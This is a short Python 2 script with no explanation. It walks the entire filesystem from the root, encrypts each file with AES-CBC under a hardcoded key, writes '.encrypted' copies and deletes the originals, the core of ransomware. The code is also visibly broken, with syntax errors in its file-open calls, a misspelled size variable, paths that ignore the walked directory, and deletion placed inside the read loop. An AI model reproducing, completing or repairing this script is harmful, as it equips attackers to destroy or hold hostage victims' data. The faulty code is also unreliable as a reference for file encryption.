#!/usr/bin/python

from Crypto.Cipher import AES
import os
import random
import struct

keyword = '1234567890123456'

def encrypt_file(key, chunk_size=64*1028):
	for root, dirs, files in os.walk('/'):
		for file in files:
			output_filename = file + '.encrypted'
			iv = os.urandom(16)
			crypt = AES.new(key, AES.MODE_CBC, iv)
			filsize = os.path.getsize(file)
			with open(file 'rb')as inputfile:
				with open(output_filename 'wb')as outputfile:
					outputfile.write(struct.pack('<Q', filesize))
					outputfile.write(iv)

					while True:
						chunk = inputfile.read(chunk_size)
						if len(chunk) == 0:
							break
						elif len(chunk) % 16 !=0:
							chunk += ' ' * (16 - len(chunk) %16)
	
						outputfile.write(crypt.encrypt(chunk))
						print os.path.join(root, file) + '.encrypted'
						os.remove(file)

encrypt_file(keyword)
